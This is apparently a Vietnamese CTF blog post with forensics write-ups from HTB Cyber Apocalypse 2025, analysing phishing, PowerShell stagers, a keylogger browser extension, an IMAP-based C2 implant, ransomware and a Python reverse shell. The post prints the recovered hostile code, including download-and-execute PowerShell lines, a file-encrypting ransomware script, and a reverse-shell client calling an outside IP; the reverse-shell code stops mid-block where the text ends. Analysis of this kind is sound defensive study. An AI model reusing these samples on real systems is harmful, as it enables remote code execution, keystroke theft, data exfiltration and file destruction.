---
title: "Cyber Apocalypse 2025"
date: 2025-03-26 12:00:00 +0700
categories: [CTF, Cyber Apocalypse 2025]
tags: [Hackthebox, forensics]
image: /assets/images2/banner.jpg
toc: true
layout: post
---

## _A new hire_ _(FORSENSICS)_
 
 ![image](https://github.com/user-attachments/assets/e9725ec1-0825-45f3-b533-a3cb000b9160)
 
 Tiếp tục là file email.eml, mở ra xem 
 
 ![image](https://github.com/user-attachments/assets/291d60c8-f0a1-41fa-860e-fcc4ffbf43ca)
 
 Hmm khá giống với thử thách trước, add IP và domain vô /etc/hosts/
 
 Truy cập http://storage.microsoftcloudservices.com:[PORT]//index.php
 
 ![image](https://github.com/user-attachments/assets/05a439ab-318b-4540-b8f9-47677819ce09)
 
 Xem source, chú ý đến đoạn sau
 
 ```html
   <div class="blur-overlay">
     <button class="view-button" onclick="getResume()">View Full Resume</button>
   </div>
   <script defer="defer">
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('main-content').style.display = 'flex';
     }, 5000);
 
     function getResume() {
       window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
     }
   </script>
 ```
 
 Trang web bị blur, mình thử bỏ nó đi thì nhận được nội dung giống như 1 CV, kh có gì đáng chú ý
 
 ![image](https://github.com/user-attachments/assets/7d5f0228-6d81-4d0b-82ee-fb8e990d5665)
 
 Nhìn xuống tiếp hàm getResume(), thấy được sử dụng JavaScript để điều khiển hiển thị nội dung và chuyển hướng người dùng đến một tệp \\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\, nhưng mình nhấn View Full Resume khi trang web đang bị blur thì kh thấy gì
 
 Từ đây mình nghĩ có thể lấy đường link _http://storage.microsoftcloudservices.com:[PORT]//index.php_  thay index.php thành \\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\ và truy cập trực tiếp luôn
 
 ![image](https://github.com/user-attachments/assets/7c4e4922-6dc1-4d35-8971-8e2b92d44b08)
 
 Tải file Resume.pdf.link về 
 
 ![image](https://github.com/user-attachments/assets/d37b2856-beab-4091-9bc9-cad6a70802aa)
 
 Decode base64
 
 ![image](https://github.com/user-attachments/assets/f5b5a99a-28aa-44ff-b378-518aa73ef0ff)
 
 Có 1 đoạn pws được dùng để mở và truy cập các đường link, truy cập vô client.py
 
 ![image](https://github.com/user-attachments/assets/1944f076-b948-47c5-afb7-fc71aef2bb7e)
 
 Thấy có 1 key và 1 data khá dài, bên dưới dùng lệnh xor key với data và chạy lệnh exec để thực thi, mình thử thay thành print để in luôn kết quả nhưng vẫn bị mã hóa, loay hoay mãi thì thử base64 decode key thì có được flag :v Lừa vl
 
 ```
 HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}
 ```

## _Thorin’s Amulet_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/1f8fd6b4-c229-4ca2-aa4e-ce5120d5db9e)

Nhận được file ps1

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Decode base64 nhận được 1 đường link, thử truy dùng port để truy cập nhưng kh đc

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Đọc kĩ lại mô tả thì thấy có NOTE

> Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

Mình dùng kali để add IP và domain vào /etc/host/

![image](https://github.com/user-attachments/assets/639b3022-3acc-40ac-be10-345154933c52)

Truy cập thử, thì nhận được file ps1 tiếp

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Lệnh trên thực hiện tải file ps1 và chạy với lệnh Bypass, muốn xem file có gì thì mình dùng curl kết hợp với KEY xác thực

![image](https://github.com/user-attachments/assets/f404de2a-bac1-4d15-a224-45825120d93a)

Decode là nhận được flag

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

## _Stealth Invasion_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/cf31068e-2c57-45e6-abe8-f1d8833dbef8)

Bài cho file memdump.elf, lần đầu mình gặp file dump mà đuôi là elf nên liền check file cái đã

![image](assets/images2/19.png)

Vẫn đúng là file dump bth thôi, giờ dùng volatility để phân tích

>**1.** What is the PID of the Original (First) Google Chrome process:

Câu này dùng plugin windows.pslist

![image](assets/images2/20.png)

```
Answer: 4080
```

>**2.** What is the only Folder on the Desktop

Câu này dùng windows.filescan | grep desktop

![image](assets/images2/21.png)

```
Answer: malext
```

>**3.** What is the Extention's ID (ex: hlkenndednhfkekhgcdicdfddnkalmdm)

Thấy trên `desktop` có được 1 số file `.js`, dump thử về xem sao (vì mình `grep` ID mãi mà nhập vô không đúng)

File `background.js`

```js
function addLog(s) {
    
    if (s.length != 1 && s !== "Enter" && !s.startsWith("PASTE"))  {
        s = `|${s}|`;
    } else if (s === "Enter" || s.startsWith("PASTE")) {
        s = s + "\r\n";
    }

    chrome.storage.local.get(["log"]).then((data) => {
        if (!data.log) {
            data.log = "";
        }

        data.log += s;

        chrome.storage.local.set({ 'log': data.log });
    });
}


chrome.runtime.onConnect.addListener((port) => {

    console.assert(port.name === "conn");
    console.log("v1.2.1");

    port.onMessage.addListener( ({ type, data }) => {
        if (type === 'key') {
            addLog(data);
        } else if (type == 'paste') {
            addLog('PASTE:' + data);
        }
    });
});

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.check === "replace_html" && chrome.storage.local.get("replace_html")) {
            sendResponse({ url: chrome.storage.local.get('replace_html_url')});
        }
    }
);
```
File `content-script.js`

```js
var conn = chrome.runtime.connect({ name: "conn" });

chrome.runtime.sendMessage('update');

(async () => {
    const response = await chrome.runtime.sendMessage({ check: "replace_html" });
    console.log(response)
})();

chrome.runtime.sendMessage('replace_html', (response) => {
    conn.postMessage({ "type": "check", "data": "replace_html" });
});

document.addEventListener("keydown", (event) => {
    const key = event.key;
    conn.postMessage({ "type": "key", "data": key });
    return true;
});


document.addEventListener("paste", (event) => {
    let paste = event.clipboardData.getData("text/plain");
    conn.postMessage({ "type": "paste", "data": paste });
    return true;
});
```
Script trên là một phần của `Chrome Extensions`, nó như một `Keylogger` dùng để lưu lại lịch sử nhấn phím của người dùng. Hỏi chatgpt thì mình có được vị trí lưu

![image](assets/images2/22.png)


![image](assets/images2/23.png)

```
Answer: nnjofihdjilebhiiemfmdlpbdkbjcpae
```

>**4.** After examining the malicious extention's code, what is the log filename in which the datais stored

Ngay hình trên lấy được 1 tệp `.log`

```
Answer: 000003.log
```
>**5.** What is the URL the user navigated to

Mình dumpfiles `000003.log` về, tệp log này ghi lại lịch sử nhấn phím người dùng bởi `malicious extensions` ở trên

![image](assets/images2/24.png)

Có thể thấy người dùng truy cập vào drive.google.com rồi thực hiện login, nên từ đây có thể lấy được luôn đáp án cho câu 6

```
Answer: drive.google.com
```

>**6.** What is the password of selene@rangers.eldoria.com

![image](assets/images2/25.png)

```
Answer: clip-mummify-proofs
```

## _Silent Trap_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/4b3da520-f51c-4f57-8c1e-fa0b1c4b8d3d)

Bài cho file pcapng, phân tích và trả lời 6 câu hỏi

>**1.**  What is the subject of the first email that the victim opened and replied to?

Follow HTTP stream 4, thấy được cuộc giao tiếp giữa client và server

![image](assets/images2/5.png)

Thực hiện GET request xem trước email (_action=preview) trong hộp thư đến (_mbox=INBOX) với UID 71 => opened

Sau đó xuống dưới, thực hiện tiếp GET request với email trên, yêu cầu tải 1 hình ảnh => `replied`

```
Answer: Game Crash on Level 5
```


>**2.**  On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)

Lúc đang làm thì mình ngồi xem HTTP stream 1, thấy có một GET request lấy danh sách email trong hộp thư đến, server sẽ response danh sách dưới dạng json

![image](assets/images2/6.png)

Mình thấy được 1 email với tiêu đề `Bug Report - In-game Imbalance Issue in Eldoria`, Eldoria có gì đó giống với tên giải nên mình lấy luôn time của cái email đó

Nhập vô thấy correct :v
```
\nthis.add_message_row(72,{\"subject\":\"Bug Report - In-game Imbalance Issue in Eldoria\",\"fromto\":\"<span class=\\\"adr\\\"><span title=\\\"proplayer@email.com\\\" class=\\\"rcmContactAddress\\\">proplayer@email.com</span></span>\",\"date\":\"Today 15:46\",\"size\":\"13 KB\"},{\"ctype\":\"multipart/mixed\",\"mbox\":\"INBOX\"},false)
```

```
Answer: 2025-02-24_15:46
```
>**3.** What is the MD5 hash of the malware file?

Export object HTTP, thấy có 1 file zip, khả năng đây sẽ chứa malware

![image](assets/images2/7.png)

Save về không unzip được, thử crack cũng kh được, thì khả năng mật khẩu sẽ đc tìm thấy trong pcap

Mình tìm đến stream 8, xem cuộc hội thoại giữa client và server về email liên quan đến malware kia

![image](assets/images2/8.png)

Mình đoán sẽ có pass unzip ở trong này, thử tìm password thì ra

![image](assets/images2/9.png)

Unzip nhận được 1 file `Eldoria_Balance_Issue_Report.pdf.exe`

![image](assets/images2/10.png)

```
Answer: c0b37994963cc0aadd6e78a256c51547
```

>**4.** What credentials were used to log into the attacker's mailbox? (Format: username:password)

Lúc mới vào làm, thì mình thấy có khá nhiều packet, nên có hỏi AI xem cần chú ý vào những protocol nào thì có được chỉ rằng là `IMAP`

Thử lọc IMAP thì có đc luôn username và password

![image](assets/images2/11.png)

Hoặc là có thể reverse con `malware` kia, `.Net` mình dùng dotpeek để decomplie

![image](assets/images2/12.png)

Chương trình trên viết bằng `C#` để kết nối đến `IMAP server` sử dụng giao thức `TCP` và `SSL/TLS`

Nhìn vào hàm creds, đây là hàm lưu thông tin đăng nhập để có thể xác thực với máy chủ email `mail.korptech.net`

![image](assets/images2/13.png)

```
Answer: proplayer@email.com:completed
```
>**5.** What is the name of the task scheduled by the attacker?

Khi làm thì mình cần tìm câu trả lời càng sớm càng tốt, nên đã kiểu đoán mò khá nhiều, mình đã follow hết các stream liên quan đến IMAP nhưng kh thấy có task scheduled nào của attacker, nên mình nghĩ khả năng rất cao là nó nằm trong đống bị mã hóa này

![image](assets/images2/14.png)

Từ đây mình sẽ đi vào phân tích đoạn code C#, chú ý đến các hàm sau

```C#
private static void create(string text)
    {
      text = "From: " + Environment.UserName + "\r\nSubject: " + DateTime.UtcNow.ToString() + "_report_" + Program.comp_id + "\r\n\r\n" + text;
      byte[] bytes = Encoding.ASCII.GetBytes("$ APPEND Inbox {" + text.Length.ToString() + "}\r\n" + text + "\r\n");
      Task.Factory.FromAsync<byte[], int, int>(new Func<byte[], int, int, AsyncCallback, object, IAsyncResult>(((Stream) Program.ssl).BeginWrite), new Action<IAsyncResult>(((Stream) Program.ssl).EndWrite), bytes, 0, bytes.Length, (object) Program.ssl);
    }
```

Hàm create tạo một email cơ bản với thông tin người gửi, chủ đề (dựa trên thời gian và comp_id), và nội dung text. Sau đó, nó gửi email này lên máy chủ IMAP (vào thư mục "Inbox") thông qua kết nối mạng bảo mật (Program.ssl). Nội dung gửi chính là đoạn văn bản bị mã hóa kia

Tiếp theo

```csharp
private static void execute(string[] commands)
    {
      try
      {
        Program.connect(Program.creds.Split(':')[2], 143);
        Program.Login(Program.creds.Split(':')[0], Program.creds.Split(':')[1]);
      }
      catch
      {
        try
        {
          Program.connect(Program.r_creds.Split(':')[2], 143);
          Program.Login(Program.r_creds.Split(':')[0], Program.r_creds.Split(':')[1]);
        }
        catch
        {
        }
      }
      foreach (string command in commands)
      {
        if (command.Contains("change_"))
          Program.change(command);
        else
          Program.create(Convert.ToBase64String(Program.xor(Encoding.UTF8.GetBytes(Program.cmd(command)))));
      }
    }
```

Hàm `execute` thực hiện cố gắng kết nối đến máy chủ email bằng tài khoản chính (proplayer@email.com) , nếu không được thì dùng tài khoản dự phòng (proplayer1@email.com)
- Nếu không phải lệnh `change_` thì chạy lệnh, mã hóa kết quả, và gửi lên máy chủ dưới dạng email

Tiếp theo là hàm mã hóa xor

![image](assets/images2/15.png)

Hàm sử dụng một mảng byte cố định gồm 256 phần tử làm khóa (key)

Đến đây là mình bị stuck, vì ban đầu mình nghĩ thì chỉ là xor giữa key và data xong base64 encoded thông thường nhưng thử rất nhiều script giải mã mà kh cho ra kết quả mong muốn

Nhìn kĩ lại thì thấy ban đầu hàm return `Exor.encrypt`, giờ mình sẽ đi tìm hàm Exor xem nó làm gì

```csharp
namespace imap_chanel
{
  public class Exor
  {
    public static byte[] Encrypt(byte[] pwd, byte[] data)
    {
      int[] numArray1 = new int[256];
      int[] numArray2 = new int[256];
      byte[] numArray3 = new byte[data.Length];
      for (int index = 0; index < 256; ++index)
      {
        numArray1[index] = (int) pwd[index % pwd.Length];
        numArray2[index] = index;
      }
      int index1;
      for (int index2 = index1 = 0; index1 < 256; ++index1)
      {
        index2 = (index2 + numArray2[index1] + numArray1[index1]) % 256;
        int num = numArray2[index1];
        numArray2[index1] = numArray2[index2];
        numArray2[index2] = num;
      }
      int num1;
      int index3 = num1 = 0;
      int index4 = num1;
      int index5 = num1;
      for (; index3 < data.Length; ++index3)
      {
        index5 = (index5 + 1) % 256;
        index4 = (index4 + numArray2[index5]) % 256;
        int num2 = numArray2[index5];
        numArray2[index5] = numArray2[index4];
        numArray2[index4] = num2;
        int num3 = numArray2[(numArray2[index5] + numArray2[index4]) % 256];
        numArray3[index3] = (byte) ((uint) data[index3] ^ (uint) num3);
      }
      return numArray3;
    }
  }
}
```
Đoạn mã trên thực hiện mã hóa RC4, Nó nhận vào một mảng byte pwd (khóa) và một mảng byte data (dữ liệu cần mã hóa)

Đến đây đã xác định được kiểu mã hóa cho đoạn email được gửi đi ở trên:
- RC4 tạo keystream
- Xor keystream với data
- Base64 encoded

Giờ sẽ làm ngược lại và nhờ AI viết để decrypt

```python
import base64

def rc4(key, data):
    S = list(range(256))
    j = 0
    out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

# Khóa RC4 từ mảng byte bạn cung cấp
key = bytes([
    168, 115, 174, 213, 168, 222, 72, 36, 91, 209, 242, 128, 69, 99, 195, 164,
    238, 182, 67, 92, 7, 121, 164, 86, 121, 10, 93, 4, 140, 111, 248, 44,
    30, 94, 48, 54, 45, 100, 184, 54, 28, 82, 201, 188, 203, 150, 123, 163,
    229, 138, 177, 51, 164, 232, 86, 154, 179, 143, 144, 22, 134, 12, 40, 243,
    55, 2, 73, 103, 99, 243, 236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
    111, 240, 108, 86, 85, 63, 44, 49, 241, 6, 3, 170, 131, 150, 53, 49,
    126, 72, 60, 36, 144, 248, 55, 10, 241, 208, 163, 217, 49, 154, 206, 227,
    25, 99, 18, 144, 134, 169, 237, 100, 117, 22, 11, 150, 157, 230, 173, 38,
    72, 99, 129, 30, 220, 112, 226, 56, 16, 114, 133, 22, 96, 1, 90, 72,
    162, 38, 143, 186, 35, 142, 128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
    246, 232, 205, 236, 254, 152, 145, 98, 126, 29, 217, 74, 177, 142, 19, 190,
    182, 151, 233, 157, 76, 74, 104, 155, 79, 115, 5, 18, 204, 65, 254, 204,
    118, 71, 92, 33, 58, 112, 206, 151, 103, 179, 24, 164, 219, 98, 81, 6,
    241, 100, 228, 190, 96, 140, 128, 1, 161, 246, 236, 25, 62, 100, 87, 145,
    185, 45, 61, 143, 52, 8, 227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
    227, 9, 146, 156, 208, 206, 194, 134, 194, 23, 233, 100, 38, 158, 58, 159
])

# Dữ liệu Base64 cần giải mã
b64_data = """

"""

# Giải mã
data = base64.b64decode(b64_data)
decrypted = rc4(key, data)
print(decrypted.decode(errors="ignore"))
```
Data lấy tại luồng tcp.stream 35

![image](assets/images2/16.png)

![image](assets/images2/17.png)

```
Answer: Synchronization
```
>**6.** What is the API key leaked from the highly valuable file discovered by the attacker?

Vẫn tiếp tục là lấy data đem decode, thì ở stream 97 sẽ có được đáp án

![image](assets/images2/18.png)

```
Answer: sk-3498fwe09r8fw3f98fw9832fw
```

## _Cave Expedition_ _(FORSENSICS)_

![image](assets/images2/57.png)


Bài cho tất cả các folder `LOG` chứa rất nhiều tệp

Dùng tool Evtxcmd để trích xuất hết ra csv hoặc json rồi ngồi lọc thôi

![image](assets/images2/1.png)

Mình đã ngồi lọc hết các log dư thừa, chỉ giữ lại một số lệnh powershell thực thi

Ví dụ

![image](assets/images2/2.png)

Tiếp theo là trích xuất hết đoạn nằm trong commandline khá giống base64 rồi đem đi decode ra được đoạn mã ps1 sau

```powershell
$k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
$m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="

$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

$e90Vg = @{}
$f12Vh = @{}

$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

function a12Vc {
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}

For ($x = 65; $x -le 90; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) }
}

function n90Vp {
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo))
}

function l56Vn {
    return (a12Vc $k34Vm).Split(" ")
}

For ($x = 97; $x -le 122; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) }
}

For ($x = 48; $x -le 57; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) }
}

$e90Vg.GetEnumerator() | ForEach-Object {
    $f12Vh[$_.Value] = $_.Key
}

function l34Vn {
    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
    $p12Vr = [byte[]]::new($m56Vo.Length)
    for ($x = 0; $x -lt $m56Vo.Length; $x++) {
        $q34Vs = $n78Vp[$x % $n78Vp.Length]
        $r56Vt = $o90Vq[$x % $o90Vq.Length]
        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
    }
    return $p12Vr
}

function s78Vu {
    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)

    if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {
        return $null
    }

    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb

    return [Convert]::ToBase64String($a34Vc)
}

function o12Vq {
    param([switch]$p34Vr)

    try {
        if ($p34Vr) {
            foreach ($q56Vs in l56Vn) {
                $d34Vp = "dca01aq2/"
                if (Test-Path $d34Vp) {
                    Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$q56Vs$" } |
                        ForEach-Object {
                            $r78Vt = $_.FullName
                            if (Test-Path $r78Vt) {
                                $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                Remove-Item $r78Vt -Force
                            }
                        }
                }
            }
        }
    }
    catch {}
}

if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
    o12Vq -p34Vr
    n90Vp
}
```
Decode base64 hàm `k34Vm` và `m78Vo` ra được thông điệp của attacker

![image](assets/images2/3.png)
Giờ sẽ đi vào phân tích kĩ đoạn pws trên

Chương trình thực hiện mã hóa Xor 2 lần với 2 key bị base64 encrypt

```powershell
$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
```

Data được lấy ở dạng byte từ các file office, cụ thể ở đây mình nhận được là file map.pdf.secured
- Thực hiện việc Xor data với key1 là `a53Va`
- Tiếp theo lấy data vừa rồi xor tiếp với key2 là `b64Vb`
- Cuối cùng là base64 `encoded`, lưu file với đuôi `.sercured` và xóa file gốc ban đầu

Script giải mã:

```powershell
# Định nghĩa hàm giải mã XOR
function Decode-Xor {
    param([byte[]]$data, [byte[]]$key1, [byte[]]$key2)
    $result = [byte[]]::new($data.Length)
    for ($i = 0; $i -lt $data.Length; $i++) {
        $k1 = $key1[$i % $key1.Length]
        $k2 = $key2[$i % $key2.Length]
        $result[$i] = $data[$i] -bxor $k1 -bxor $k2
    }
    return $result
}

# Khóa từ mã nguồn
$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
$c56Ve = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a53Va))  # Chuỗi khóa 1
$d78Vf = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64Vb))  # Chuỗi khóa 2

# Chuyển khóa thành byte
$key1Bytes = [Text.Encoding]::UTF8.GetBytes($c56Ve)
$key2Bytes = [Text.Encoding]::UTF8.GetBytes($d78Vf)

# Đường dẫn đến file trong thư mục cố định
$securedFile = "C:\Users\EM SUN\Downloads\forensics_cave_expedition\map.pdf.secured"
$outputFile = "C:\Users\EM SUN\Downloads\forensics_cave_expedition\map_decrypted.pdf"

# Kiểm tra file tồn tại
if (-not (Test-Path $securedFile)) {
    Write-Host "Lỗi: Không tìm thấy file 'map.pdf.secured' tại '$securedFile'"
    Write-Host "Vui lòng kiểm tra lại đường dẫn hoặc tên file."
    exit
}

try {
    # Đọc file .secured
    $base64Content = [IO.File]::ReadAllText($securedFile)
    $encryptedBytes = [Convert]::FromBase64String($base64Content)

    # Giải mã
    $decryptedBytes = Decode-Xor $encryptedBytes $key1Bytes $key2Bytes

    # Lưu file PDF
    [IO.File]::WriteAllBytes($outputFile, $decryptedBytes)
    Write-Host "Đã giải mã file thành công. Kết quả lưu tại: $outputFile"
} catch {
    Write-Host "Lỗi trong quá trình giải mã: $($_.Exception.Message)"
}
```

Mở powershell chạy script là done

![image](assets/images2/4.png)

```
HTB{Dunl0rn_dRAk3_LA1r_15_n0W_5AF3}
```

## _TOOLPIE_ _(FORENSICS)_
![image](https://github.com/user-attachments/assets/74acfcd7-04ac-4e90-a6f0-1e72c11cbf41)

Bài cho 1 file pcapng, nhiệm vụ là phân tích và trả lời 6 câu hỏi

![image](assets/images2/45.png)

Mới đầu vào, mình follow tcp.stream, vì chỉ có 6 luồng nên mình sẽ ngồi phân tích hết

Đầu tiên là stream 0, thấy được 1 GET request từ IP 194.59.6.66 đến 1 HOST: 13.61.177.227, với yêu cả trả về trang chủ của 1 trang web

![image](assets/images2/46.png)

Trong phần nav của trang web có 2 liên kết là idex.html và script.html

Kết hợp với đó là mình export objects HTML và save all

![image](assets/images2/47.png)

Ta thử truy cập vào script.html xem sao

![image](assets/images2/48.png)

Đây giống như là một trang web cho người dùng thực hiện nhập mã Python rồi nhấn Execute để thực thi

Chưa có gì đặc biệt lắm, nên cùng đi đến với stream thứ 1

Tiếp tục là GET request từ 194.59.6.66 đối với server và ở gần cuối có 1 lệnh GET request tới /script.html

![image](assets/images2/49.png)

Khi ng dùng nhập mã và thực thi trên trang này thì nó sẽ gửi 1 yêu cầu POST/execute đến server

Và ngay sau đó là stream 3, vẫn tiếp tục là IP đó đã nhập mã và thực thi, nhìn script Python này uy tín vcl :v

![image](assets/images2/50.png)

Sau đó, stream 4 thì server đã thực hiện gửi `ec2amaz-bktvi3e\administrator` và có những phản hồi từ 1 IP __khác__ là 13.61.7.128. Đến đây mình sẽ có 1 số nhận định sau

- Thứ nhất, IP chịu trách nhiệm cho việc xâm phạm web của câu hỏi 1 đề cập chắc chắn là 194.59.6.66

```
1. What is the IP address responsible for compromising the website?
Answer: 194.59.6.66
```

- Thứ hai, Attacker có thể đã gửi payload Python độc hại đến /execute, khiến server chạy mã độc. Nên /execute chính là enpoint giúp trả lời cho câu 2
```
2. What is the name of the endpoint exploited by the attacker?
Answer: execute
```

- Thứ ba, IP 13.61.7.128 rất có thể là máy chủ C2 (Command & Control), nơi attacker có thể điều khiển hệ thống đã bị khai thác và ở câu 4 cũng có hỏi liên quan đến C2 nhưng mình nhập không đúng do thiếu port ( mình sẽ phân tích tiếp đoạn này ở bên dưới)

Tiếp theo, mình sẽ đi phân tích ở đoạn mã Python mà attacker đã gửi đi, đoạn script thực thi bị nén `bz2` sau đó là `marshal.loads` rồi `exec`

Giải nén xong, mình đã đưa về được file `.pyc` nhưng kh thể đưa về mã nguồn `.py` được, sau đó AI có hỗ trợ mình có thể đưa về bytecode

![image](assets/images2/51.png)

Ngồi đọc 1 lúc, thì mình thấy được đáp án cho câu 3

![image](assets/images2/52.png)

```
3. What is the name of the obfuscation tool used by the attacker?
Answer: Py-Fuscate
```

Vì bytecode quá dài, và mình méo hiểu gì nên nhờ AI đưa về .py theo đúng logic

```python
import os, socket, threading, time, random, string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

user = os.popen('whoami').read()
BUFFER_SIZE = 4096
SEPARATOR = '<SEPARATOR>'

def enc_mes(mes, key):
    cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
    return cypher.encrypt(pad(mes.encode() if isinstance(mes, str) else mes, 16))

def dec_mes(mes, key):
    if mes == b'': return mes
    cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
    return unpad(cypher.decrypt(mes), 16)

def receive_file(k):
    client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client2.connect(('13.61.7.218', 54163))
    client2.send(k.encode())
    received = dec_mes(client2.recv(BUFFER_SIZE), k).decode().split(SEPARATOR)
    filename, filesize = received[0], int(received[1])
    client2.send(enc_mes('ok2', k))
    msg = b''
    while len(msg) < filesize:
        msg += client2.recv(BUFFER_SIZE)
    with open(filename, 'wb') as f:
        f.write(dec_mes(msg, k))
    client2.close()

def receive(client, k):
    while True:
        try:
            msg = dec_mes(client.recv(1024), k)
            message = msg.decode()
            if message == 'check':
                client.send(enc_mes('check-ok', k))
            elif message == 'send_file':
                threading.Thread(target=receive_file, args=(k,)).start()
            elif message == 'get_file':
                client.send(enc_mes('ok', k))
                path = dec_mes(client.recv(1024), k).decode()
                with open(path, 'rb') as f:
                    data = enc_mes(f.read(), k)
                client.send(str(len(data)).encode())
                client.recv(1024)
                client.sendall(data)
            elif message:
                answer = os.popen(message).read()
                enc_answer = enc_mes(answer, k)
                client.send(str(len(enc_answer)).encode())
                if client.recv(1024).decode() == 'ok':
                    client.sendall(enc_answer)
        except:
            client.close()
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('13.61.7.218', 55155))
            k = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
            client.send(f"{user}{SEPARATOR}{k}".encode())
            time.sleep(60)

if __name__ == '__main__':
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('13.61.7.218', 55155))
    k = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
